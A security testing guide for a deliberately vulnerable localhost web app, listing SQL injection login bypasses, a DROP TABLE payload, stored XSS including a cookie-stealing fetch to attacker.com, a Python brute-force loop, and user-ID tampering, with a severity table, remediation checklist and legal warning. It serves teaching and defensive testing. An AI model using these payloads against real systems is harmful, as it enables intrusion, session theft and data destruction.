# Security Testing Guide

This guide shows you common authentication and security vulnerabilities to test in this application.

## 🎯 Testing Checklist

### 1️⃣ SQL Injection Attacks

#### Login Form - SQL Injection
**Attack Vector:**
```
Username: admin' --
Password: anything
Expected Result: Login bypass (you become admin)
```

**Another variant:**
```
Username: admin' OR '1'='1' --
Password: anything
```

**Why it works:**
- No input sanitization
- Direct string concatenation in SQL queries
- Backend query: `SELECT * FROM users WHERE username = '{username}' AND password = '{password}'`

---

#### Search Box - SQL Injection

**Attack Vector:**
```
Search Query: ' OR '1'='1
Result: Returns all users
```

**Another variant:**
```
Search Query: '; DROP TABLE users; --
```

**Why it works:**
- Same vulnerability in search functionality
- Backend query: `SELECT id, username FROM users WHERE username LIKE '%{query}%'`

---

### 2️⃣ XSS (Cross-Site Scripting) Attacks

#### Stored XSS in Comments

**Attack Vector:**
```
Comment: <script>alert('XSS Vulnerability Found!')</script>
Expected: JavaScript executes when comment is viewed
```

**More dangerous example:**
```
Comment: <img src=x onerror="alert('XSS: '+document.cookie)">
```

**Cookie stealing:**
```
Comment: <script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

**Why it works:**
- No HTML escaping on comment display
- User input stored and rendered as HTML
- Comments displayed without sanitization

---

#### Stored XSS in User Bio

**Attack Vector:**
```
Bio: <script>document.location='http://attacker.com/steal'</script>
Expected: Redirect when someone views your profile
```

**Why it works:**
- Bio field in profile not sanitized
- Any HTML/JavaScript stored and executed

---

### 3️⃣ Weak Authentication

#### No Password Hashing

**Testing:**
1. Register a new user with password: `test123`
2. Check MySQL: `SELECT * FROM users WHERE username='newuser';`
3. Password is stored as plain text!

**Attack Vector:**
- If database is compromised, all passwords exposed
- Database admin can see everyone's passwords

#### Hardcoded Credentials

**Testing:**
- Login with: `admin` / `admin123`
- This account is exposed in code
- No protection against credential stuffing

---

### 4️⃣ Session Management Issues

#### No Session Protection

**Testing:**
1. Login to account
2. Open Developer Tools (F12) → Application
3. Look for: `user_id`, `username` stored in localStorage/cookies
4. Try modifying `user_id` in network requests

**Attack Vector:**
```javascript
// In browser console
localStorage.setItem('user_id', '2'); // Switch to another user
// Refresh and you can see their profile
```

#### No CSRF Protection

**Attack Vector:**
- Create a malicious webpage
- When victim visits, it performs actions as them (create posts, change profile)

---

### 5️⃣ Information Disclosure

#### Error Messages Reveal Database Info

**Testing:**
1. Try SQL injection and observe error messages
2. Error messages may expose:
   - Database structure
   - Technology stack
   - File paths

**Example:**
```
Enter username: ' OR
Error: MySQL Error at line 25 in app.py: Column 'OR' doesn't exist
```

#### Source Code Exposure

**Testing:**
- Check Network tab (F12) for commented code
- Try to find .git directory
- Look for backup files (.bak, .old)

---

### 6️⃣ No Rate Limiting

#### Brute Force Attack

**Testing:**
```python
import requests

for i in range(10000):
    password = f"password{i}"
    response = requests.post('http://localhost:5000/api/login', 
        json={'username': 'admin', 'password': password})
    if response.json().get('success'):
        print(f"Found password: {password}")
```

**Why it works:**
- No rate limiting on login endpoint
- No account lockout after failed attempts
- Unlimited login tries allowed

---

### 7️⃣ Privilege Escalation

#### User ID Manipulation

**Testing:**
1. Login as `user1` (user_id = 2)
2. In Developer Tools, modify API request
3. Change `/api/users/2` to `/api/users/1` 
4. You can now view admin's profile!

**Attack Vector:**
```javascript
// Change your own profile but target admin
fetch('http://localhost:5000/api/users/1/update', {
  method: 'POST',
  body: JSON.stringify({bio: 'Hacked!'})
})
```

---

### 8️⃣ No Input Validation

#### Special Characters & Encoding

**Testing:**
- Register with username: `<admin>`, `admin';`, `admin\0`
- Search for: `%`, `_`, `*`
- Post comments with: `<html>`, `<?php`, null bytes

**Why it works:**
- No input validation on server
- No whitelist of allowed characters
- No length restrictions

---

### 9️⃣ Plain Text HTTP (No HTTPS)

#### Credential Sniffing

**Testing:**
1. Use a network proxy (Burp Suite, Wireshark)
2. Observe login credentials sent over HTTP
3. Credentials visible in plain text!

**Why it works:**
- Application runs on HTTP (not HTTPS)
- All traffic unencrypted
- Man-in-the-Middle (MITM) attacks possible

---

### 🔟 No Security Headers

#### Missing HTTP Security Headers

**Testing:**
```bash
curl -i http://localhost:5000/api/login
```

**Look for missing headers:**
- `Content-Security-Policy` - XSS protection
- `X-Frame-Options` - Clickjacking protection
- `X-Content-Type-Options` - MIME type sniffing
- `Strict-Transport-Security` - HTTPS enforcement

---

## 🧪 Advanced Testing Scenarios

### Complete Attack Chain

**Scenario:** Modify another user's profile

```
1. Use SQL Injection to find all user IDs
   Search: ' OR '1'='1
   Result: Get list of all users

2. Extract user ID of target (e.g., admin = ID:1)

3. Intercept your own update profile request
   POST /api/users/2/update 
   {bio: "I am hacked"}

4. Modify the request to:
   POST /api/users/1/update
   {bio: "Admin has been compromised!"}

5. Admin's profile now shows your message
```

---

## 📊 Vulnerability Severity

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| SQL Injection | 🔴 CRITICAL | Full database access |
| XSS | 🔴 CRITICAL | Session hijacking, data theft |
| No Password Hashing | 🔴 CRITICAL | Credential compromise |
| No HTTPS | 🟠 HIGH | Credential sniffing |
| No Rate Limiting | 🟠 HIGH | Brute force attacks |
| Missing CSRF Protection | 🟠 HIGH | Unauthorized actions |
| Weak Session Management | 🟡 MEDIUM | Session hijacking |
| Information Disclosure | 🟡 MEDIUM | Aids further attacks |

---

## 📝 Testing Report Template

```
### Test Case: [Name]
- **Vulnerability:** [Type]
- **Attack Vector:** [How to exploit]
- **Expected Result:** [What should happen]
- **Actual Result:** [What actually happens]
- **Severity:** Critical / High / Medium / Low
- **CVSS Score:** X.X
- **Recommendation:** [How to fix]
```

---

## 🔒 Verification After Fixes (Phase 2)

After implementing security patches, retest:

1. ✅ SQL Injection - Parameterized queries
2. ✅ XSS - HTML escaping
3. ✅ Password Hashing - bcrypt validation
4. ✅ Rate Limiting - 429 responses
5. ✅ CSRF - Token validation
6. ✅ HTTPS - SSL certificates
7. ✅ Session - Secure cookies
8. ✅ Input Validation - Whitelist enforcement

---

## 🛠️ Tools for Testing

- **Burp Suite Community** - HTTP proxy for testing
- **Postman** - API testing
- **OWASP ZAP** - Automated security scanning
- **SQLMap** - SQL Injection testing
- **Firefox Developer Tools** - Client-side testing
- **curl** - Command-line HTTP requests

---

**Remember:** Only test on YOUR OWN application. Unauthorized testing is illegal! 🚨
